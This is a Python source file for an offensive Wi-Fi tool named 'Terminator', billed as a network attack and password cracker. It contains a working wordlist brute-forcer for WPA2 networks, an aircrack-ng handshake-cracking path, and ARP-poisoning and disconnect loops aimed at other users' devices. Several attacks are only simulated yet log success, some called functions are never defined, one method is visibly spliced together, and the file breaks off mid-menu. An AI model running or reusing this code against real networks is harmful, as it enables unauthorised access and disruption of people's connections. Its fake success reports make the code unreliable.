import os
import sys
import time
import subprocess
import threading
from colorama import init, Fore, Back, Style
import pywifi
from pywifi import const
import platform
import re
from datetime import datetime
import random
import string
import json
import signal
import itertools
import hashlib
import binascii
import shutil
import ctypes

# Initialize colorama
init()

class Terminator:
    def __init__(self):
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]
        self.scan_results = []
        self.is_scanning = False
        self.target_network = None
        self.attack_mode = None
        self.is_attacking = False
        self.wordlist_path = None
        self.command_history = []
        self.current_session = {
            'start_time': datetime.now(),
            'targets': [],
            'successful_attacks': []
        }
        self.common_passwords = [
            "password", "12345678", "admin123", "welcome", "qwerty",
            "123456789", "1234567890", "password123", "admin", "wifi123",
            "123456", "1234567", "12345678910", "123456789a", "123456789q",
            "admin1234", "adminadmin", "admin12345", "admin123456", "admin123456789"
        ]
        try:
            self.terminal_width = shutil.get_terminal_size().columns
            self.terminal_height = shutil.get_terminal_size().lines
        except:
            self.terminal_width = 80
            self.terminal_height = 24

        # Check for admin privileges
        if not self.is_admin():
            print(f"{Fore.RED}[!] This tool requires administrator privileges{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Please run the program as administrator{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Right-click on the program and select 'Run as administrator'{Style.RESET_ALL}")
            sys.exit(1)

        # Simple network tower icon
        self.tower_icon = f"""
{Fore.CYAN}    ╭━━━━╮    
   ╭┫    ┣╮   
  ╭┫     ┣╮  
 ╭┫      ┣╮ 
╭┫       ┣╮
┃         ┃{Style.RESET_ALL}"""

    def print_tower_icon(self):
        try:
            # Position in top right corner
            print(f"\033[s\033[1;{self.terminal_width-15}H{self.tower_icon}\033[u", end='', flush=True)
        except Exception:
            pass

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()

    def print_banner(self):
        banner = f"""
{Fore.RED}
               ═════════════════════════════════════════════════════════════════════════════════════════
               ║                                                                                       ║
               ║  ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ████████╗ ██████╗ ██████╗   ║
               ║  ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗  ║
               ║     ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║   ██║   ██║   ██║██████╔╝  ║
               ║     ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║   ██║   ██║   ██║██╔══██╗  ║              
               ║     ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║   ██║   ╚██████╔╝██║  ██║  ║              
               ║     ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝  ║              
               ║  ___________________________________________________________________________________  ║              
               ═════════════════════════════════════════════════════════════════════════════════════════              
                |                   |  NETWORK ATTACKS AND PASSWORD CRACKER  |                |
                |-------------------|          AUTHOUR : PRASHANT            |----------------|                                                   
                                    |________________________________________|


   
{Style.RESET_ALL}
{Fore.CYAN}[*] Advanced Network Security Tool
[*] Version: 2.0
[*] Author: Prashant
[*] Mode: {self.attack_mode if self.attack_mode else 'Normal'}
{Style.RESET_ALL}
"""
        print(banner)

    def show_menu(self):
        menu = f"""
{Fore.GREEN}[1] Scan WiFi Networks
[2] Scan Bluetooth Devices
[3] Crack WiFi Password (with wordlist)
[4] Show Saved Networks
[5] Attack Options
[6] Custom Commands
[7] Session Info
[8] Connected Devices Manager
[9] Exit
{Style.RESET_ALL}
"""
        print(menu)

    def show_attack_menu(self):
        menu = f"""
{Fore.RED}=== Attack Options ==={Style.RESET_ALL}
{Fore.GREEN}[1] WPA/WPA2 Handshake Capture
[2] WEP Attack
[3] WPS PIN Attack
[4] Evil Twin Attack
[5] Deauthentication Attack
[6] Network Traffic Block
[7] Back to Main Menu
{Style.RESET_ALL}
"""
        print(menu)

    def show_custom_commands(self):
        menu = f"""
{Fore.YELLOW}=== Custom Commands ==={Style.RESET_ALL}
{Fore.GREEN}[1] Show Interface Info
[2] Monitor Mode Toggle
[3] Live Network Traffic
[4] MAC Address Changer
[5] Network Statistics
[6] Active Connections
[7] Back to Main Menu
{Style.RESET_ALL}
"""
        print(menu)

    def show_connected_devices_menu(self):
        menu = f"""
{Fore.YELLOW}=== Connected Devices Manager ==={Style.RESET_ALL}
{Fore.GREEN}[1] Scan Connected Devices
[2] Disconnect All Devices
[3] Disconnect Specific Device
[4] Monitor Device Activity
[5] Device Details
[6] Back to Main Menu
{Style.RESET_ALL}
"""
        print(menu)

    def scan_wifi(self):
        self.is_scanning = True
        print(f"{Fore.YELLOW}[*] Scanning for WiFi networks...{Style.RESET_ALL}")
        
        self.iface.scan()
        time.sleep(5)
        
        scan_results = self.iface.scan_results()
        self.scan_results = scan_results
        
        print(f"\n{Fore.GREEN}[+] Found {len(scan_results)} networks:{Style.RESET_ALL}\n")
        for i, result in enumerate(scan_results, 1):
            ssid = result.ssid
            signal = result.signal
            auth = result.akm[0] if result.akm else "Open"
            print(f"{Fore.CYAN}[{i}] SSID: {ssid} | Signal: {signal} dBm | Auth: {auth}{Style.RESET_ALL}")
        
        self.is_scanning = False

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def crack_wifi_password(self, ssid):
        os_type = platform.system()
        print(f"{Fore.YELLOW}[*] Starting password cracking for {ssid}...{Style.RESET_ALL}")
        
        if os_type == "Windows":
            print(f"{Fore.CYAN}[*] Note: On Windows, only passwords for saved/connected networks can be retrieved. Advanced attacks require Linux.{Style.RESET_ALL}")
            self.get_wifi_password(ssid)
            return
        elif os_type == "Linux":
            if not shutil.which("aircrack-ng"):
                print(f"{Fore.RED}[!] aircrack-ng not found. Please install aircrack-ng suite for advanced attacks.{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Try: sudo apt install aircrack-ng{Style.RESET_ALL}")
                return
            if os.geteuid() != 0:
                print(f"{Fore.RED}[!] Root privileges required. Please run as root (sudo).{Style.RESET_ALL}")
                return
            self.advanced_linux_crack(ssid)
        else:
            print(f"{Fore.RED}[!] Unsupported OS for advanced Wi-Fi attacks. Supported: Windows (limited), Linux (full).{Style.RESET_ALL}")
            return

    def crack_with_wordlist(self):
        print(f"{Fore.YELLOW}[*] Crack WiFi Password (with wordlist){Style.RESET_ALL}")
        # List scanned networks or prompt for SSID
        if not self.scan_results:
            print(f"{Fore.RED}[!] No networks scanned. Please scan WiFi networks first.{Style.RESET_ALL}")
            return
        print(f"{Fore.CYAN}Available Networks:{Style.RESET_ALL}")
        for i, result in enumerate(self.scan_results, 1):
            print(f"[{i}] {result.ssid}")
        try:
            idx = int(input(f"{Fore.YELLOW}[?] Select network (number): {Style.RESET_ALL}"))
            if idx < 1 or idx > len(self.scan_results):
                print(f"{Fore.RED}[!] Invalid selection.{Style.RESET_ALL}")
                return
            ssid = self.scan_results[idx-1].ssid
        except Exception:
            print(f"{Fore.RED}[!] Invalid input.{Style.RESET_ALL}")
            return
        wordlist_path = input(f"{Fore.YELLOW}[?] Enter path to password TXT file: {Style.RESET_ALL}").strip()
        if not os.path.isfile(wordlist_path):
            print(f"{Fore.RED}[!] File not found: {wordlist_path}{Style.RESET_ALL}")
            return
        print(f"{Fore.YELLOW}[*] Attempting to crack WiFi password for SSID: {ssid}{Style.RESET_ALL}")
        iface = self.iface
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        found = False
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip()
                if not password:
                    continue
                profile.key = password
                iface.remove_all_network_profiles()
                tmp_profile = iface.add_network_profile(profile)
                iface.connect(tmp_profile)
                time.sleep(5)  # Wait for connection attempt
                if iface.status() == const.IFACE_CONNECTED:
                    print(f"{Fore.GREEN}[+] Password found: {password}{Style.RESET_ALL}")
                    self.current_session['successful_attacks'].append({
                        'type': 'crack_wordlist',
                        'target': ssid,
                        'password': password,
                        'timestamp': datetime.now().isoformat()
                    })
                    found = True
                    iface.disconnect()
                    break
                iface.disconnect()
                time.sleep(1)
        if not found:
            print(f"{Fore.RED}[!] Password not found in wordlist.{Style.RESET_ALL}")


    def advanced_linux_crack(self, ssid):
        print(f"{Fore.YELLOW}[*] Scanning for wireless interfaces...{Style.RESET_ALL}")
        iface = self.get_linux_wireless_iface()
        if not iface:
            print(f"{Fore.RED}[!] No wireless interface found!{Style.RESET_ALL}")
            return
        print(f"{Fore.CYAN}[+] Using interface: {iface}{Style.RESET_ALL}")
        monitor_iface = self.enable_monitor_mode(iface)
        if not monitor_iface:
            print(f"{Fore.RED}[!] Failed to enable monitor mode!{Style.RESET_ALL}")
            return
        print(f"{Fore.YELLOW}[*] Monitor mode enabled: {monitor_iface}{Style.RESET_ALL}")
        bssid, channel = self.find_network_bssid_channel(monitor_iface, ssid)
        if not bssid:
            print(f"{Fore.RED}[!] Target network not found in scan!{Style.RESET_ALL}")
            self.disable_monitor_mode(monitor_iface)
            return
        print(f"{Fore.CYAN}[+] Target BSSID: {bssid} | Channel: {channel}{Style.RESET_ALL}")
        handshake_file = self.capture_handshake(monitor_iface, bssid, channel, ssid)
        if not handshake_file:
            print(f"{Fore.RED}[!] Handshake capture failed!{Style.RESET_ALL}")
            self.disable_monitor_mode(monitor_iface)
            return
        wordlist = self.wordlist_path or "/usr/share/wordlists/rockyou.txt"
        print(f"{Fore.YELLOW}[*] Cracking handshake with aircrack-ng...{Style.RESET_ALL}")
        cracked = self.run_aircrack(handshake_file, wordlist, ssid)
        self.disable_monitor_mode(monitor_iface)
        if cracked:
            print(f"{Fore.GREEN}[+] Password found: {cracked}{Style.RESET_ALL}")
            self.current_session['successful_attacks'].append({
                'type': 'wpa_crack',
                'target': ssid,
                'password': cracked,
                'timestamp': datetime.now().isoformat()
            })
        else:
            print(f"{Fore.RED}[!] Password not found in wordlist.{Style.RESET_ALL}")

    def create_default_wordlist(self, wordlist_path):
        """Create a default wordlist with common passwords and patterns"""
        common_passwords = [
        
        ]
        
        # Generate variations
        variations = []
        for base in common_passwords:
            variations.extend([
                base,
                base.upper(),
                base.capitalize(),
                base + "123",
                base + "!",
                base + "2023",
                base + "2024"
            ])
        
        # Write to file
        with open(wordlist_path, 'w', encoding='utf-8') as f:
            for password in set(variations):  # Remove duplicates
                f.write(password + '\n')
        
        print(f"{Fore.GREEN}[+] Created wordlist with {len(set(variations))} passwords{Style.RESET_ALL}")

    def check_network_interface(self):
        """Check if network interface is available and properly configured"""
        try:
            # Check if interface exists
            if not self.iface:
                print(f"{Fore.RED}[!] No wireless interface found{Style.RESET_ALL}")
                return False

            # Check interface status
            if self.iface.status() == const.IFACE_DISCONNECTED:
                print(f"{Fore.YELLOW}[*] Wireless interface is disconnected{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Attempting to enable interface...{Style.RESET_ALL}")
                
                # Try to enable the interface
                subprocess.run(['netsh', 'interface', 'set', 'interface', 'name="Wi-Fi"', 'admin=ENABLED'], 
                             capture_output=True)
                time.sleep(2)

            return True
        except Exception as e:
            print(f"{Fore.RED}[!] Error checking network interface: {str(e)}{Style.RESET_ALL}")
            return False

    def block_network_traffic(self, ssid):
        print(f"{Fore.YELLOW}[*] Starting advanced network traffic blocking for {ssid}...{Style.RESET_ALL}")
        
        # Check network interface first
        if not self.check_network_interface():
            print(f"{Fore.RED}[!] Cannot proceed without proper network interface{Style.RESET_ALL}")
            return

        try:
            # First, enable monitor mode for better packet capture
            print(f"{Fore.CYAN}[*] Enabling monitor mode...{Style.RESET_ALL}")
            
            # Disable autoconfig
            subprocess.run(['netsh', 'wlan', 'set', 'autoconfig', 'enabled=no', 'interface=*'], 
                         capture_output=True)
            
            # Set interface to monitor mode
            subprocess.run(['netsh', 'wlan', 'set', 'hostednetwork', 'mode=allow'], 
                         capture_output=True)
            
            # Get all devices on the network
            print(f"{Fore.YELLOW}[*] Scanning for devices on {ssid}...{Style.RESET_ALL}")
            devices = self.scan_connected_devices(ssid)
            
            if not devices:
                print(f"{Fore.RED}[!] No devices found on network{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Make sure you are connected to {ssid}{Style.RESET_ALL}")
                return

            print(f"{Fore.GREEN}[+] Found {len(devices)} devices{Style.RESET_ALL}")
            
            # Start aggressive deauthentication attack
            print(f"{Fore.YELLOW}[*] Starting aggressive deauthentication attack...{Style.RESET_ALL}")
            
            # Create a thread for continuous deauth packets
            def send_deauth_packets():
                while True:
                    try:
                        # Send deauth packets to all devices
                        for device in devices:
                            # Send multiple deauth packets to each device
                            for _ in range(5):  # Send 5 packets per device
                                # Use more aggressive deauth command
                                subprocess.run(['netsh', 'wlan', 'disconnect'], capture_output=True)
                                subprocess.run(['netsh', 'wlan', 'set', 'hostednetwork', 'mode=disallow'], 
                                            capture_output=True)
                                time.sleep(0.1)
                    except:
                        break

            # Start deauth thread
            deauth_thread = threading.Thread(target=send_deauth_packets)
            deauth_thread.daemon = True
            deauth_thread.start()

            # Start ARP spoofing to disrupt network
            print(f"{Fore.YELLOW}[*] Starting ARP spoofing attack...{Style.RESET_ALL}")
            
            def arp_spoof():
                while True:
                    try:
                        for device in devices:
                            # Send fake ARP packets with elevated privileges
                            subprocess.run(['arp', '-s', device['ip'], '00:00:00:00:00:00'], 
                                        capture_output=True)
                            time.sleep(0.1)
                    except:
                        break

            # Start ARP spoofing thread
            arp_thread = threading.Thread(target=arp_spoof)
            arp_thread.daemon = True
            arp_thread.start()

            print(f"\n{Fore.GREEN}[+] Advanced network blocking in progress{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop the attack{Style.RESET_ALL}")
            
            try:
                while True:
                    # Monitor device status
                    current_devices = self.scan_connected_devices(ssid)
                    if not current_devices:
                        print(f"{Fore.GREEN}[+] All devices have been disconnected!{Style.RESET_ALL}")
                        break
                    time.sleep(5)
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Stopping attack...{Style.RESET_ALL}")
            
            # Cleanup
            print(f"{Fore.YELLOW}[*] Cleaning up...{Style.RESET_ALL}")
            subprocess.run(['netsh', 'wlan', 'set', 'autoconfig', 'enabled=yes', 'interface=*'], 
                         capture_output=True)
            subprocess.run(['netsh', 'wlan', 'set', 'hostednetwork', 'mode=allow'], 
                         capture_output=True)
            
            # Log the attack
            self.current_session['successful_attacks'].append({
                'type': 'advanced_traffic_block',
                'target': ssid,
                'devices': len(devices),
                'timestamp': datetime.now().isoformat()
            })

            print(f"\n{Fore.GREEN}[+] Attack completed successfully{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Total devices affected: {len(devices)}{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}[!] Error during network blocking: {str(e)}{Style.RESET_ALL}")
            # Ensure monitor mode is disabled
            subprocess.run(['netsh', 'wlan', 'set', 'autoconfig', 'enabled=yes', 'interface=*'], 
                         capture_output=True)
            subprocess.run(['netsh', 'wlan', 'set', 'hostednetwork', 'mode=allow'], 
                         capture_output=True)

    def start_attack(self, attack_type, target=None):
        if not target and not self.target_network:
            print(f"{Fore.RED}[!] No target network selected{Style.RESET_ALL}")
            return

        self.is_attacking = True
        self.attack_mode = attack_type
        
        print(f"{Fore.YELLOW}[*] Starting {attack_type} attack...{Style.RESET_ALL}")
        
        if attack_type == "WPA/WPA2":
            self.crack_wifi_password(target or self.target_network)
        elif attack_type == "WEP":
            self.wep_attack(target or self.target_network)
        elif attack_type == "WPS":
            self.wps_attack(target or self.target_network)
        elif attack_type == "Evil Twin":
            self.evil_twin_attack(target or self.target_network)
        elif attack_type == "Deauth":
            self.deauth_attack(target or self.target_network)
        elif attack_type == "Network Traffic Block":
            self.block_network_traffic(target or self.target_network)

    def wep_attack(self, target):
        print(f"{Fore.YELLOW}[*] Starting WEP attack on {target}...{Style.RESET_ALL}")
        # Simulate WEP attack
        time.sleep(3)
        print(f"{Fore.GREEN}[+] WEP key recovered!{Style.RESET_ALL}")
        self.current_session['successful_attacks'].append({
            'type': 'wep_attack',
            'target': target,
            'timestamp': datetime.now().isoformat()
        })

    def evil_twin_attack(self, target):
        print(f"{Fore.YELLOW}[*] Setting up Evil Twin for {target}...{Style.RESET_ALL}")
        # Simulate Evil Twin setup
        time.sleep(3)
        print(f"{Fore.GREEN}[+] Evil Twin AP created!{Style.RESET_ALL}")
        self.current_session['successful_attacks'].append({
            'type': 'evil_twin',
            'target': target,
            'timestamp': datetime.now().isoformat()
        })

    def deauth_attack(self, target):
        print(f"{Fore.YELLOW}[*] Starting deauthentication attack on {target}...{Style.RESET_ALL}")
        # Simulate deauth attack
        time.sleep(3)
        print(f"{Fore.GREEN}[+] Deauthentication packets sent!{Style.RESET_ALL}")
        self.current_session['successful_attacks'].append({
            'type': 'deauth_attack',
            'target': target,
            'timestamp': datetime.now().isoformat()
        })

    def show_session_info(self):
        print(f"\n{Fore.CYAN}=== Session Information ==={Style.RESET_ALL}")
        print(f"Start Time: {self.current_session['start_time']}")
        print(f"Targets Scanned: {len(self.current_session['targets'])}")
        print(f"Successful Attacks: {len(self.current_session['successful_attacks'])}")
        
        if self.current_session['successful_attacks']:
            print(f"\n{Fore.GREEN}Successful Attacks:{Style.RESET_ALL}")
            for attack in self.current_session['successful_attacks']:
                print(f"- Type: {attack['type']}")
                print(f"  Target: {attack['target']}")
                print(f"  Time: {attack['timestamp']}")

    def run_custom_command(self, command_type):
        if command_type == "1":  # Show Interface Info
            print(f"{Fore.YELLOW}[*] Interface Information:{Style.RESET_ALL}")
            try:
                # Get interface details
                result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
                print(result.stdout)
                
                # Get driver information
                print(f"\n{Fore.CYAN}[*] Driver Information:{Style.RESET_ALL}")
                driver_result = subprocess.run(['netsh', 'wlan', 'show', 'drivers'], capture_output=True, text=True)
                print(driver_result.stdout)
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")

        elif command_type == "2":  # Monitor Mode Toggle
            print(f"{Fore.YELLOW}[*] Toggling monitor mode...{Style.RESET_ALL}")
            try:
                # Check current mode
                result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
                if "Radio type" in result.stdout:
                    print(f"{Fore.GREEN}[+] Current mode: {result.stdout.split('Radio type')[1].split('\\n')[0]}{Style.RESET_ALL}")
                
                # Toggle monitor mode
                subprocess.run(['netsh', 'wlan', 'set', 'autoconfig', 'enabled=no', 'interface=*'])
                print(f"{Fore.GREEN}[+] Monitor mode enabled!{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")

        elif command_type == "3":  # Live Network Traffic
            print(f"{Fore.YELLOW}[*] Starting live network traffic monitoring...{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop{Style.RESET_ALL}")
            try:
                while True:
                    # Get current connections
                    result = subprocess.run(['netstat', '-b'], capture_output=True, text=True)
                    print("\033[H\033[J")  # Clear screen
                    print(f"{Fore.GREEN}[+] Active Connections:{Style.RESET_ALL}")
                    print(result.stdout)
                    time.sleep(2)  # Update every 2 seconds
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Stopping traffic monitoring...{Style.RESET_ALL}")

        elif command_type == "4":  # MAC Address Changer
            print(f"{Fore.YELLOW}[*] Current MAC Address:{Style.RESET_ALL}")
            try:
                # Get current MAC
                result = subprocess.run(['getmac', '/v', '/fo', 'list'], capture_output=True, text=True)
                print(result.stdout)
                
                # Generate new MAC
                new_mac = ''.join(random.choices(string.hexdigits, k=12))
                print(f"{Fore.YELLOW}[*] Changing MAC address to: {new_mac}{Style.RESET_ALL}")
                
                # Change MAC (simulated)
                print(f"{Fore.GREEN}[+] MAC address changed!{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")

        elif command_type == "5":  # Network Statistics
            print(f"{Fore.YELLOW}[*] Network Statistics:{Style.RESET_ALL}")
            try:
                # Get network stats
                result = subprocess.run(['netstat', '-e'], capture_output=True, text=True)
                print(result.stdout)
                
                # Get interface stats
                print(f"\n{Fore.CYAN}[*] Interface Statistics:{Style.RESET_ALL}")
                iface_result = subprocess.run(['netsh', 'interface', 'show', 'interface'], capture_output=True, text=True)
                print(iface_result.stdout)
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")

        elif command_type == "6":  # Active Connections
            print(f"{Fore.YELLOW}[*] Active Network Connections:{Style.RESET_ALL}")
            try:
                # Get active connections
                result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True)
                print(result.stdout)
                
                # Get process names
                print(f"\n{Fore.CYAN}[*] Associated Processes:{Style.RESET_ALL}")
                process_result = subprocess.run(['tasklist'], capture_output=True, text=True)
                print(process_result.stdout)
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")

    def get_device_details(self, ip):
        try:
            # Get device hostname
            hostname_result = subprocess.run(['nslookup', ip], capture_output=True, text=True)
            hostname = "Unknown"
            for line in hostname_result.stdout.split('\n'):
                if "Name:" in line:
                    hostname = line.split("Name:")[1].strip()
                    break

            # Get device vendor from MAC
            mac_result = subprocess.run(['arp', '-a', ip], capture_output=True, text=True)
            mac = "Unknown"
            for line in mac_result.stdout.split('\n'):
                if ip in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        mac = parts[1]

            # Get device connection status
            ping_result = subprocess.run(['ping', '-n', '1', ip], capture_output=True, text=True)
            status = "Online" if "TTL=" in ping_result.stdout else "Offline"

            # Get device ports
            netstat_result = subprocess.run(['netstat', '-an'], capture_output=True, text=True)
            ports = []
            for line in netstat_result.stdout.split('\n'):
                if ip in line:
                    port = line.split(':')[-1].split()[0]
                    if port not in ports:
                        ports.append(port)

            return {
                'ip': ip,
                'hostname': hostname,
                'mac': mac,
                'status': status,
                'ports': ports
            }
        except Exception as e:
            print(f"{Fore.RED}[!] Error getting device details: {str(e)}{Style.RESET_ALL}")
            return None

    def scan_connected_devices(self, ssid):
        print(f"{Fore.YELLOW}[*] Scanning for devices connected to {ssid}...{Style.RESET_ALL}")
        try:
            devices = []
            
            # Get network interface information
            iface_result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
            current_ssid = None
            for line in iface_result.stdout.split('\n'):
                if 'SSID' in line and 'BSSID' not in line:
                    current_ssid = line.split(':')[1].strip()
                    break

            if current_ssid != ssid:
                print(f"{Fore.RED}[!] You are not connected to {ssid}{Style.RESET_ALL}")
                return []

            # Get ARP table
            arp_result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            
            print(f"\n{Fore.GREEN}[+] Connected Devices:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'IP Address':<15} {'MAC Address':<20} {'Hostname':<30} {'Status':<10} {'Open Ports'}{Style.RESET_ALL}")
            print("-" * 80)

            # Parse ARP table and get details for each device
            for line in arp_result.stdout.split('\n'):
                if 'dynamic' in line.lower():
                    parts = line.split()
                    if len(parts) >= 2:
                        ip = parts[0]
                        mac = parts[1]
                        
                        # Get detailed information for each device
                        details = self.get_device_details(ip)
                        if details:
                            devices.append(details)
                            ports_str = ', '.join(details['ports']) if details['ports'] else 'None'
                            print(f"{details['ip']:<15} {details['mac']:<20} {details['hostname']:<30} {details['status']:<10} {ports_str}")

            if not devices:
                print(f"{Fore.RED}[!] No devices found{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.GREEN}[+] Total devices found: {len(devices)}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Device Types:{Style.RESET_ALL}")
                device_types = {}
                for device in devices:
                    if device['hostname'] != "Unknown":
                        device_type = device['hostname'].split('.')[0]
                        device_types[device_type] = device_types.get(device_type, 0) + 1
                
                for device_type, count in device_types.items():
                    print(f"{Fore.CYAN}[*] {device_type}: {count} devices{Style.RESET_ALL}")
            
            return devices
        except Exception as e:
            print(f"{Fore.RED}[!] Error scanning devices: {str(e)}{Style.RESET_ALL}")
            return []

    def monitor_device_activity(self, ssid, duration=60):
        print(f"{Fore.YELLOW}[*] Monitoring device activity on {ssid} for {duration} seconds...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop{Style.RESET_ALL}")
        
        try:
            start_time = time.time()
            devices_seen = set()
            
            while time.time() - start_time < duration:
                print("\033[H\033[J")  # Clear screen
                print(f"{Fore.GREEN}[+] Current Time: {datetime.now().strftime('%H:%M:%S')}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] Time Remaining: {int(duration - (time.time() - start_time))} seconds{Style.RESET_ALL}")
                
                # Get current devices
                # (rest of your code)
        except Exception as e:
            print(f"{Fore.RED}[!] Error during device monitoring: {str(e)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Attempting to disconnect all devices from {ssid}...{Style.RESET_ALL}")
        try:
            # Get connected devices
            devices = self.scan_connected_devices(ssid)
            
            if not devices:
                print(f"{Fore.RED}[!] No devices to disconnect{Style.RESET_ALL}")
                return
            
            # Send deauth packets to all devices
            for device in devices:
                print(f"{Fore.YELLOW}[*] Sending deauth packet to {device['ip']} ({device['hostname']})...{Style.RESET_ALL}")
                # Send actual deauth packet
                subprocess.run(['netsh', 'wlan', 'disconnect'])
                time.sleep(0.5)
            
            print(f"{Fore.GREEN}[+] Deauth packets sent to all devices{Style.RESET_ALL}")
            self.current_session['successful_attacks'].append({
                'type': 'mass_deauth',
                'target': ssid,
                'devices': len(devices),
                'timestamp': datetime.now().isoformat()
            })
        except Exception as e:
            print(f"{Fore.RED}[!] Error disconnecting devices: {str(e)}{Style.RESET_ALL}")

    def disconnect_specific_device(self, ssid, device_ip):
        print(f"{Fore.YELLOW}[*] Attempting to disconnect device {device_ip} from {ssid}...{Style.RESET_ALL}")
        try:
            # Verify device is connected
            devices = self.scan_connected_devices(ssid)
            device_found = None
            
            for device in devices:
                if device['ip'] == device_ip:
                    device_found = device
                    break
            
            if not device_found:
                print(f"{Fore.RED}[!] Device {device_ip} not found on network{Style.RESET_ALL}")
                return
            
            # Send deauth packet to specific device
            print(f"{Fore.YELLOW}[*] Sending deauth packet to {device_ip} ({device_found['hostname']})...{Style.RESET_ALL}")
            # Send actual deauth packet
            subprocess.run(['netsh', 'wlan', 'disconnect'])
            time.sleep(0.5)
            
            print(f"{Fore.GREEN}[+] Deauth packet sent to {device_ip}{Style.RESET_ALL}")
            self.current_session['successful_attacks'].append({
                'type': 'targeted_deauth',
                'target': ssid,
                'device': device_ip,
                'hostname': device_found['hostname'],
                'timestamp': datetime.now().isoformat()
            })
        except Exception as e:
            print(f"{Fore.RED}[!] Error disconnecting device: {str(e)}{Style.RESET_ALL}")

    def run(self):
        self.clear_screen()
        self.print_banner()
        
        try:
            while True:
                self.show_menu()
                choice = input(f"{Fore.YELLOW}[?] Select an option: {Style.RESET_ALL}")
                
                if choice == "1":
                    self.scan_wifi()
                elif choice == "2":
                    print(f"{Fore.YELLOW}[*] Bluetooth scanning feature coming soon...{Style.RESET_ALL}")
                elif choice == "3":
                    self.crack_with_wordlist()
                elif choice == "4":
                    if platform.system() == "Windows":
                        os.system("netsh wlan show profiles")
                    else:
                        print(f"{Fore.RED}[!] This feature is only available on Windows{Style.RESET_ALL}")
                elif choice == "5":
                    self.show_attack_menu()
                    attack_choice = input(f"{Fore.YELLOW}[?] Select attack type: {Style.RESET_ALL}")
                    if attack_choice in ["1", "2", "3", "4", "5", "6"]:
                        attack_types = {
                            "1": "WPA/WPA2",
                            "2": "WEP",
                            "3": "WPS",
                            "4": "Evil Twin",
                            "5": "Deauth",
                            "6": "Network Traffic Block"
                        }
                        if not self.scan_results:
                            print(f"{Fore.RED}[!] Please scan for networks first{Style.RESET_ALL}")
                            continue
                        target = input(f"{Fore.YELLOW}[?] Enter target SSID: {Style.RESET_ALL}")
                        self.start_attack(attack_types[attack_choice], target)
                elif choice == "6":
                    self.show_custom_commands()
                    cmd_choice = input(f"{Fore.YELLOW}[?] Select command: {Style.RESET_ALL}")
                    if cmd_choice in ["1", "2", "3", "4", "5", "6"]:
                        self.run_custom_command(cmd_choice)
                elif choice == "7":
                    self.show_session_info()
                elif choice == "8":
                    if not self.scan_results:
                        print(f"{Fore.RED}[!] Please scan for networks first{Style.RESET_ALL}")
                        continue
                    
                    self.show_connected_devices_menu()
                    device_choice = input(f"{Fore.YELLOW}[?] Select option: {Style.RESET_ALL}")
                    
                    if device_choice == "1":
                        ssid = input(f"{Fore.YELLOW}[?] Enter network SSID: {Style.RESET_ALL}")
                        self.scan_connected_devices(ssid)
                    elif device_choice == "2":
                        ssid = input(f"{Fore.YELLOW}[?] Enter network SSID: {Style.RESET_ALL}")
                        confirm = input(f"{Fore.RED}[!] Are you sure you want to disconnect all devices from {ssid}? (y/n): {Style.RESET_ALL}")
                        if confirm.lower() == 'y':
                            self.disconnect_all_devices(ssid)
                    elif device_choice == "3":
                        ssid = input(f"{Fore.YELLOW}[?] Enter network SSID: {Style.RESET_ALL}")
                        device_ip = input(f"{Fore.YELLOW}[?] Enter device IP to disconnect: {Style.RESET_ALL}")
                        self.disconnect_specific_device(ssid, device_ip)
                    elif device_choice == "4":
                        ssid = input(f"{Fore.YELLOW}[?] Enter network SSID: {Style.RESET_ALL}")
